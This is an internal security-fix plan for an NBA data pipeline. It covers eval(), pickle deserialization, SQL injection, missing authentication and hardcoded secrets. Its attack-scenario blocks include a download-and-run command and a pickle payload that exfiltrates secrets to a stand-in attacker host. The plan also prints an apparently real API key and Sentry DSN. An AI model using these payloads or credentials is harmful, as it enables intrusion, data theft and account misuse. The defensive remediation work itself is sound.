# WEEK 0 SECURITY FIXES - COMPLETE SCOPE (13 Issues)
## NBA Daily Orchestration Improvements - Pre-Phase A

**Date:** January 19, 2026
**Version:** 2.0 (Complete - incorporates security review findings)
**Status:** 🔴 BLOCKING PHASE A DEPLOYMENT
**Total Effort:** 15.5-19 hours (updated from 9.5-11 hours)
**Sessions:** 3 focused sessions recommended

**Previous Version:** WEEK-0-SECURITY-ADDENDUM.md (6 issues, incomplete scope)
**Review Source:** SECURITY-REVIEW-FEEDBACK.md (multi-agent security analysis)

---

## EXECUTIVE SUMMARY

### Critical Update After Security Review

**Original Scope:** 6 security issues, 9.5-11 hours
**UPDATED SCOPE:** **13 security issues, 15.5-19 hours**

**New Critical Findings:**
- 🔴 **Issue #8: eval() Code Execution** - CRITICAL RCE (30 min)
- 🔴 **Issue #7: Pickle Deserialization** - CRITICAL RCE (1-2 hours)
- ⚠️ **Issue #9: Missing Authentication** - HIGH (1 hour)
- 📈 **Issue #2: SQL Injection EXPANDED** - 8 queries → **41 queries** (+4-6 hours)
- 📈 **Issue #3: Fail-Open EXPANDED** - 1 location → **4 locations** (+1.5 hours)

### Why This Matters

**Remote Code Execution (RCE) is MORE severe than SQL injection:**
- eval() allows attackers to execute ANY Python code
- Pickle allows code execution via malicious model files
- Both can lead to: data exfiltration, backdoors, system compromise
- **MUST be fixed before deploying ANY other security fixes**

---

## PRIORITY-ORDERED ISSUE LIST

| # | Issue | Severity | Effort | Type | Fix Order |
|---|-------|----------|--------|------|-----------|
| **#8** | **eval() Code Execution** | **CRITICAL** | **30 min** | RCE | **1st** |
| **#7** | **Pickle Deserialization** | **CRITICAL** | **1-2h** | RCE | **2nd** |
| **#1** | **Hardcoded Secrets (API + Sentry)** | **CRITICAL** | **35 min** | Credentials | **3rd** |
| **#9** | **Missing Authentication** | **HIGH** | **1h** | Access Control | **4th** |
| **#3** | **Fail-Open Errors (4 locations)** | **CRITICAL** | **2.75h** | Data Integrity | **5th** |
| **#2** | **SQL Injection (DELETE queries)** | **HIGH** | **2-3h** | Injection | **6th** |
| **#2** | **SQL Injection (original 8)** | **HIGH** | **3h** | Injection | **7th** |
| **#4** | **Input Validation** | **MAJOR** | **1.5h** | Defense Depth | **8th** |
| **#2** | **SQL Injection (extended 29)** | **MEDIUM-HIGH** | **3-4h** | Injection | **9th** |
| **#10** | **Thread Pool Exhaustion** | **MEDIUM** | **1.5h** | Availability | **10th** |
| **#12** | **Pub/Sub Message Validation** | **MEDIUM** | **1h** | Input Validation | **11th** |
| **#13** | **Sensitive Data in Logs** | **MEDIUM** | **45 min** | Info Disclosure | **12th** |
| **#5** | **Cloud Logging Stub** | **MAJOR** | **30 min** | Monitoring | **13th** |
| **#11** | **TOCTOU Race Condition** | **MEDIUM** | **45 min** | Logic Error | **14th** |

**Total: 15.5-19 hours**

---

## SESSION BREAKDOWN (RECOMMENDED)

### SESSION 1: Critical Code Execution (2.5-3 hours) ⚠️

**Fixes Remote Code Execution vulnerabilities - HIGHEST PRIORITY**

- Issue #8: eval() removal (30 min)
- Issue #7: Pickle replacement (1-2 hours)
- Issue #1: Hardcoded secrets (35 min)

**Why First:** Eliminates most severe attack vectors

---

### SESSION 2: High Severity Security (7-9 hours)

**Fixes access control, SQL injection critical paths, fail-open**

- Issue #9: Add authentication (1 hour)
- Issue #3: Fix fail-open patterns (2.75 hours)
- Issue #2: SQL injection - DELETE queries (2-3 hours)
- Issue #2: SQL injection - original 8 queries (3 hours) [partial if time]

**Why Second:** High-severity issues, bulk of security work

---

### SESSION 3: Medium Severity + Validation (6-7 hours)

**Completes remaining security + docs + validation**

- Issue #2: SQL injection - extended scope (3-4 hours)
- Issue #4: Input validation (1.5 hours)
- Issue #10-13: Medium severity issues (4 hours)
- Documentation updates (2 hours)
- Final validation (1 hour)

**Why Third:** Lower stakes, can defer if needed

---

## DETAILED ISSUE DOCUMENTATION

### 🔴 ISSUE #8: eval() Code Execution - CRITICAL (FIX FIRST!)

**Severity:** CRITICAL
**Priority:** #1 (FIX IMMEDIATELY)
**Effort:** 30 minutes
**Type:** Remote Code Execution (RCE)

#### Location

**File:** `scripts/test_nbac_gamebook_processor.py`
**Lines:** 40-44

#### Vulnerable Code

```python
try:
    data = json.loads(content)
except json.JSONDecodeError:
    # Try eval for dict-like strings
    data = eval(content)  # 🔴 DIRECT CODE EXECUTION
```

#### Attack Scenario

```python
# Attacker uploads malicious GCS file
gs://bucket/test-data.json contains:
__import__('os').system('curl attacker.com/backdoor.sh | bash')

# When script runs: instant RCE
# Attacker now has shell access to your Cloud Run instance
# Can exfiltrate data, install backdoor, pivot to other systems
```

#### Why This Is Critical

- **NO restrictions** - executes ANY Python code
- **Full system access** - can read files, make network requests, execute commands
- **Persistent backdoor** - attacker can modify code, add SSH keys, etc.
- **Data exfiltration** - access to all environment variables, BigQuery credentials, etc.

#### Required Fix

```python
import ast
import json

try:
    data = json.loads(content)
except json.JSONDecodeError:
    try:
        # SAFE: Only evaluates Python literals (str, int, list, dict, etc.)
        # CANNOT execute code - ast.literal_eval blocks all function calls
        data = ast.literal_eval(content)
    except (ValueError, SyntaxError) as e:
        raise ValueError(f"Invalid data format: {e}")
```

#### Implementation Steps (30 minutes)

- [ ] **Replace eval() with ast.literal_eval()** - 10 min
  - [ ] Open `scripts/test_nbac_gamebook_processor.py`
  - [ ] Import `ast` module
  - [ ] Replace `eval(content)` with `ast.literal_eval(content)`
  - [ ] Add proper exception handling

- [ ] **Search for other eval() usage** - 10 min
  ```bash
  grep -r "eval(" --include="*.py" . | grep -v "test" | grep -v ".pyc"
  ```
  - [ ] Fix any additional instances found

- [ ] **Test the fix** - 10 min
  - [ ] Test: Valid Python literal (dict) → should work
  - [ ] Test: Code execution attempt → should raise ValueError
  - [ ] Test: JSON → should still use json.loads() path

**CRITICAL: This MUST be the first security fix applied!**

---

### 🔴 ISSUE #7: Insecure Pickle Deserialization - CRITICAL

**Severity:** CRITICAL
**Priority:** #2
**Effort:** 1-2 hours
**Type:** Remote Code Execution (RCE)

#### Location

**File:** `ml/model_loader.py`
**Lines:** 224-230

#### Vulnerable Code

```python
def _load_sklearn(path: str) -> Optional[Any]:
    """Load sklearn model from pickle"""
    import pickle
    with open(path, 'rb') as f:
        return pickle.load(f)  # 🔴 NO INTEGRITY VALIDATION
```

#### Attack Scenario

```python
# Attacker compromises GCS bucket or has write access
# Creates malicious pickle file:
import pickle
import os

class MaliciousModel:
    def __reduce__(self):
        # This code executes when pickle.load() is called
        return (os.system, ('curl attacker.com/exfil?data=$(cat /secrets/* | base64)',))

# Save to GCS
with open('model.pkl', 'wb') as f:
    pickle.dump(MaliciousModel(), f)

# When model_loader loads this file:
# - Arbitrary code executes during deserialization
# - Secrets exfiltrated
# - Backdoor installed
# - No logs or alerts (happens during load, not execution)
```

#### Why This Is Critical

- **Code execution during deserialization** - no function call needed
- **No visibility** - happens before model is even used
- **Persistent** - every time model loads, code executes
- **Supply chain attack** - if models are shared/downloaded

#### Required Fix (Option 1: joblib with hash validation)

```python
import joblib
import hashlib
import os

def _load_sklearn(path: str) -> Optional[Any]:
    """
    Load sklearn model with integrity validation.

    Expected hash stored in: {path}.sha256
    """
    # Read hash file
    hash_file = f"{path}.sha256"
    if not os.path.exists(hash_file):
        raise ValueError(f"Hash file missing: {hash_file}")

    with open(hash_file, 'r') as f:
        expected_hash = f.read().strip()

    # Verify file integrity
    with open(path, 'rb') as f:
        content = f.read()
        actual_hash = hashlib.sha256(content).hexdigest()

        if actual_hash != expected_hash:
            raise ValueError(f"Model file integrity check FAILED - possible tampering")

    # Load with joblib (safer than raw pickle, but still needs validation)
    return joblib.load(path)
```

#### Implementation Steps (1-2 hours)

- [ ] **Create hash generation script** - 30 min
  ```python
  # scripts/generate_model_hashes.py
  import hashlib
  import glob

  for model_file in glob.glob('models/**/*.pkl', recursive=True):
      with open(model_file, 'rb') as f:
          hash_value = hashlib.sha256(f.read()).hexdigest()

      with open(f"{model_file}.sha256", 'w') as f:
          f.write(hash_value)

      print(f"Generated hash for {model_file}")
  ```

- [ ] **Update model_loader.py** - 30 min
  - [ ] Replace pickle.load() with integrity-checked joblib.load()
  - [ ] Add hash validation before loading
  - [ ] Add error handling for missing/invalid hashes

- [ ] **Generate hashes for existing models** - 15 min
  - [ ] Run hash generation script on all models
  - [ ] Commit .sha256 files to git
  - [ ] Document hash verification in README

- [ ] **Test the fix** - 15 min
  - [ ] Test: Valid model + correct hash → loads successfully
  - [ ] Test: Valid model + wrong hash → raises ValueError
  - [ ] Test: Missing hash file → raises ValueError

**Alternative (if model format allows):** Migrate to ONNX or safetensors (no code execution possible)

---

### 🔴 ISSUE #1: Hardcoded Secrets - CRITICAL (Updated)

**Severity:** CRITICAL
**Priority:** #3
**Effort:** 35 minutes (updated: +5 min for Sentry DSN)
**Type:** Credential Exposure

#### Locations (2 secrets found)

**Secret 1:** BettingPros API Key
- **File:** `scrapers/utils/nba_header_utils.py`
- **Line:** 154
- **Value:** `CHi8Hy5CEE4khd46XNYL23dCFX96oUdw6qOt1Dnh`

**Secret 2:** Sentry DSN (NEW)
- **File:** `scrapers/scraper_base.py`
- **Line:** 24
- **Value:** `https://96f5d7efbb7105ef2c05aa551fa5f4e0@o102085.ingest.us.sentry.io/4509460047790080`

#### Required Fixes

**Fix 1: BettingPros API Key (25 min)**
```python
# scrapers/utils/nba_header_utils.py
import os

BETTINGPROS_HEADERS = {
    'User-Agent': 'Mozilla/5.0...',
    'Accept': 'application/json',
    'X-Api-Key': os.environ.get('BETTINGPROS_API_KEY', ''),
}

# Validation
if not BETTINGPROS_HEADERS['X-Api-Key']:
    logger.warning("BETTINGPROS_API_KEY environment variable not set")
```

**Fix 2: Sentry DSN (10 min)**
```python
# scrapers/scraper_base.py
import os
import sentry_sdk

sentry_dsn = os.environ.get('SENTRY_DSN', '')
if sentry_dsn:
    sentry_sdk.init(dsn=sentry_dsn)
else:
    logger.info("Sentry DSN not configured - monitoring disabled")
```

#### Implementation Steps (35 minutes total)

**BettingPros API Key (25 min):**
- [ ] Move to environment variable - 5 min
- [ ] Update Cloud Run config - 5 min
- [ ] Update documentation - 5 min
- [ ] Search for other secrets - 10 min

**Sentry DSN (10 min):**
- [ ] Move to environment variable - 5 min
- [ ] Update Cloud Run config - 2 min
- [ ] Test Sentry still works - 3 min

**Post-Deployment:**
- [ ] Rotate BettingPros API key (contact vendor)
- [ ] Rotate Sentry DSN (generate new project DSN)

---

### ⚠️ ISSUE #9: Missing Authentication - HIGH (NEW)

**Severity:** HIGH
**Priority:** #4
**Effort:** 1 hour
**Type:** Access Control

#### Location

**File:** `data_processors/analytics/main_analytics_service.py`
**Lines:** 454-571
**Endpoint:** `/process-date-range`

#### Vulnerable Code

```python
@app.route('/process-date-range', methods=['POST'])
def process_date_range():
    # 🔴 NO AUTHENTICATION CHECK
    # 🔴 NO AUTHORIZATION CHECK
    # 🔴 ACCEPTS ARBITRARY DATE RANGES

    data = request.get_json()
    start_date = data.get('start_date')
    end_date = data.get('end_date')
    backfill_mode = data.get('backfill_mode', False)  # Can disable checks!
```

#### Attack Scenario

```bash
# Attacker discovers Cloud Run URL (not hard - predictable naming)
curl -X POST https://analytics-processor-xyz.a.run.app/process-date-range \
  -H "Content-Type: application/json" \
  -d '{
    "start_date": "2000-01-01",
    "end_date": "2026-12-31",
    "backfill_mode": true,
    "processors": ["*"]  # All processors
  }'

# Result:
# - 26 years of analytics triggered
# - Potentially $10,000s in BigQuery charges
# - Service unavailable for hours (resource exhaustion)
# - backfill_mode=true bypasses all validation checks
```

#### Required Fix

```python
from functools import wraps
import os

def require_auth(f):
    """Decorator to require API key authentication."""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        api_key = request.headers.get('X-API-Key')
        valid_keys = os.getenv('VALID_API_KEYS', '').split(',')

        if not api_key or api_key not in valid_keys:
            logger.warning(f"Unauthorized access attempt to {request.path}")
            return jsonify({"error": "Unauthorized"}), 401

        return f(*args, **kwargs)
    return decorated_function

@app.route('/process-date-range', methods=['POST'])
@require_auth  # ← Add authentication
def process_date_range():
    # ... existing code
```

#### Implementation Steps (1 hour)

- [ ] **Create auth decorator** - 20 min
  - [ ] `require_auth()` function
  - [ ] API key validation against allowlist
  - [ ] Logging for unauthorized attempts

- [ ] **Apply to all admin endpoints** - 20 min
  - [ ] `/process-date-range`
  - [ ] Any other admin endpoints

- [ ] **Configure API keys** - 10 min
  - [ ] Generate secure API keys (use secrets.token_urlsafe())
  - [ ] Add to Cloud Run env vars
  - [ ] Document in deployment guide

- [ ] **Test authentication** - 10 min
  - [ ] Test: No API key → 401 Unauthorized
  - [ ] Test: Invalid API key → 401 Unauthorized
  - [ ] Test: Valid API key → 200 OK

---

### 🔴 ISSUE #3: Fail-Open Error Handling - CRITICAL (EXPANDED)

**Severity:** CRITICAL
**Priority:** #5
**Effort:** 2.75 hours (updated: +1.5 hours for 3 additional patterns)
**Type:** Data Integrity

#### Documented Location

✅ **Location 1:** `main_analytics_service.py` lines 139-150 (documented in original plan)

#### 🆕 NEW Fail-Open Patterns Found

⚠️ **Location 2:** `upcoming_player_game_context_processor.py` lines 1852-1866
```python
except Exception as e:
    # Returns fake "all ready" data on ANY error
    return {
        "is_complete": True,  # 🔴 FAIL-OPEN
        "completeness_pct": 100.0,  # Fake 100% complete
        # ... fake data
    }
```

⚠️ **Location 3:** `upcoming_team_game_context_processor.py` lines 1164-1177
```python
# Same pattern as Location 2
```

⚠️ **Location 4:** `roster_registry_processor.py` lines 2122-2125
```python
except Exception as e:
    return False  # No blocking - allows stale roster data
```

#### Implementation Steps (2.75 hours)

**Location 1: main_analytics_service.py (1 hour - from original plan)**
- [See original WEEK-0-SECURITY-ADDENDUM.md Section 1.3]

**Location 2: upcoming_player_game_context_processor.py (45 min)**
- [ ] **Change fail-open to fail-closed** - 20 min
  ```python
  except Exception as e:
      logger.error(f"Completeness check FAILED: {e}", exc_info=True)
      raise  # Don't return fake data - propagate error
  ```
- [ ] **Update caller error handling** - 15 min
- [ ] **Test error scenarios** - 10 min

**Location 3: upcoming_team_game_context_processor.py (45 min)**
- [ ] Same steps as Location 2

**Location 4: roster_registry_processor.py (15 min)**
- [ ] **Change to fail-closed** - 10 min
  ```python
  except Exception as e:
      logger.error(f"Roster validation FAILED: {e}")
      return True  # Block to prevent stale data
  ```
- [ ] **Test** - 5 min

---

### ⚠️ ISSUE #2: SQL Injection - HIGH (MASSIVELY EXPANDED)

**Severity:** HIGH (DELETE queries) / MEDIUM-HIGH (SELECT queries)
**Priority:** #6-9 (prioritized by severity)
**Effort:** 9-10 hours total (updated: +6-7 hours for 33 additional queries)
**Type:** Injection Attack

#### Original Scope (8 queries - 3 hours)

✅ **File 1:** `main_analytics_service.py`
- Line 74-80: Scheduled games query
- Line 90-94: BDL boxscore query

✅ **File 2:** `diagnose_prediction_batch.py`
- Lines 99-227: 6 queries

#### 🆕 EXPANDED Scope (41 total queries)

**Priority 1: DELETE Queries - Data Loss Risk (2-3 hours)**

⚠️ **File 3:** `data_processors/raw/espn/espn_boxscore_processor.py` line 468
```python
delete_query = f"DELETE FROM `{table_id}` WHERE game_id = '{game_id}' AND game_date = '{game_date}'"
# 🔴 DELETE query vulnerable to SQL injection - can delete all data
```

⚠️ **File 4:** `data_processors/raw/nbacom/nbac_play_by_play_processor.py` line 639
```python
delete_query = f"DELETE FROM `{table_id}` WHERE game_id = '{game_id}' AND game_date = '{game_date}'"
# 🔴 Same vulnerability
```

⚠️ **File 5:** `data_processors/analytics/analytics_base.py` line 2055
```python
delete_query = f"DELETE FROM `{table_id}` WHERE {date_filter}"
# 🔴 date_filter constructed from user input - affects ALL analytics processors
```

**Priority 2: SELECT/INSERT Queries (3-4 hours)**

⚠️ **File 6:** `upcoming_player_game_context_processor.py`
- **29 f-string queries** across lines 583, 659-760, 938
- Repeated vulnerable pattern throughout large file

#### Implementation Strategy

**Tier 1: DELETE Queries (MUST FIX FIRST - 2-3 hours)**
- [ ] Fix 3 DELETE queries (espn, nbacom, analytics_base)
- [ ] Test each deletion still works with parameterized queries
- [ ] Verify data not lost

**Tier 2: Original 8 Queries (3 hours)**
- [ ] Fix main_analytics_service.py (2 queries)
- [ ] Fix diagnose_prediction_batch.py (6 queries)

**Tier 3: Extended Scope (3-4 hours)**
- [ ] Fix upcoming_player_game_context_processor.py (29 queries)
- [ ] Consider automated refactoring tool

**Total SQL Injection Fix Time: 9-10 hours**

---

### REMAINING ISSUES (Medium Severity)

**Issue #4:** Input Validation - 1.5 hours (original plan)
**Issue #5:** Cloud Logging - 30 min (original plan)
**Issue #10:** Thread Pool Exhaustion - 1.5 hours (new)
**Issue #11:** TOCTOU Race Condition - 45 min (new)
**Issue #12:** Pub/Sub Message Validation - 1 hour (new)
**Issue #13:** Sensitive Data in Logs - 45 min (new)

[See SESSION-3-MEDIUM-VALIDATION.md for full details]

---

## GO/NO-GO CRITERIA (UPDATED)

### ABSOLUTE BLOCKERS (Must fix or NO-GO)

🔴 **Issue #8: eval() still present** - Direct RCE
🔴 **Issue #7: Pickle without validation** - RCE via models
🔴 **Issue #1: Hardcoded secrets** - Credential exposure
🔴 **Issue #9: No authentication** - Unauthorized access + DoS

### HIGH PRIORITY (Should fix, strong recommendation)

⚠️ **Issue #3: Fail-open patterns** - Data integrity
⚠️ **Issue #2: SQL injection (DELETE queries)** - Data loss potential
⚠️ **Issue #2: SQL injection (original 8)** - Data access

### MEDIUM PRIORITY (Fix if time, or defer with mitigation)

📊 **Issue #2: SQL injection (extended 29)** - Lower risk
📊 **Issues #10-13:** Medium severity issues

---

## TIMELINE IMPACT

**Original Plan:** 2 days (9.5-11 hours)
**Updated Plan:** 3 days (15.5-19 hours)

**Breakdown:**
- Day 1: Session 1 (Code Execution) - 2.5-3 hours
- Day 2: Session 2 (High Severity) - 7-9 hours
- Day 3: Session 3 (Medium + Validation) - 6-7 hours

**Acceptable increase given:**
- 2 Critical RCE vulnerabilities found
- 33 additional SQL injection points
- 3 additional fail-open patterns
- Missing authentication endpoint

---

## NEXT STEPS

1. **Review this complete scope** (you are here)
2. **Start Session 1: Code Execution** (eval + pickle + secrets)
3. **Continue Session 2: High Severity** (auth + SQL + fail-open)
4. **Complete Session 3: Medium + Validation** (remaining + docs)

**See individual session documents for implementation details:**
- SESSION-1-CODE-EXECUTION.md
- SESSION-2-HIGH-SEVERITY.md
- SESSION-3-MEDIUM-VALIDATION.md

---

**Document Created:** January 19, 2026
**Version:** 2.0 (Complete Scope)
**Status:** READY FOR EXECUTION
**Total Issues:** 13 (6 original + 7 new)
**Total Effort:** 15.5-19 hours
